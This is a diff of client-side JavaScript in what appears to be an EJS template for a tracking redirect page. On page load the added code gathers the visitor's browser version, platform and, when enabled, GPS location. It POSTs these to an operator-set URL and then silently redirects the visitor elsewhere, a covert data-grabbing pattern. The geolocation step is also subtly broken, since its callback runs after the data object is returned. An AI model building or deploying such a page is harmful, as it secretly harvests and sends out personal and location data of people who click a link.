@@ -116,50 +116,60 @@
 
 //EJS VALUE =>
 
-let redirect = "<%-redirect%>"
-let sendLinks= "<%- sendLinks%>"
-let time     = "<%- time%>"
+let redirect = "<%-redirect %>"
+let sendLinks= "<%- sendLinks %>"
+let time     = Number("<%- time %>")
+let options  = JSON.parse('<%- JSON.stringify(options) %>')
 
+console.log(options)
 
 function pushToUrl(informations, url)
 {
     let options =
     {
+        method: "POST",
         headers: {
             "content-type": "application/json",
-        }
+        },
         body: JSON.stringify(informations)
-        )
     }
+
+    console.log(options)
 
     fetch(url, options)
 }
 
 
-function redirect(url, time)
+function redirectToUrl(url, time)
 {
     setTimeout(()=>{
         window.location.replace(url)
     }, time)
 }
 
-
-
-async function app()
+function getInformation(options)
 {
-    console.log(redirect)
-    console.log(sendLinks)
-    console.log(time)
+  let informations = {
+    navigator: window.navigator.appVersion,
+    os: window.navigator.platform,
+  }
 
+  if(options.gps && navigator.geolocation)
+  {
+    navigator.geolocation.getCurrentPosition((pos)=>{
+      informations.gps = pos.coords
+    })
+  }
 
-    let informations =
-    {
-        navigator: window.navigator.appVersion,
-        os: window.navigator.platform,
-    }
+  return informations
+}
 
-    pushToUrl(informations, sendLInks)
-    redirect(redirect, time)
+function app()
+{
+    let informations = getInformation(options)
+    
+    pushToUrl(informations, sendLinks)
+    redirectToUrl(redirect, time)
 }
 
 
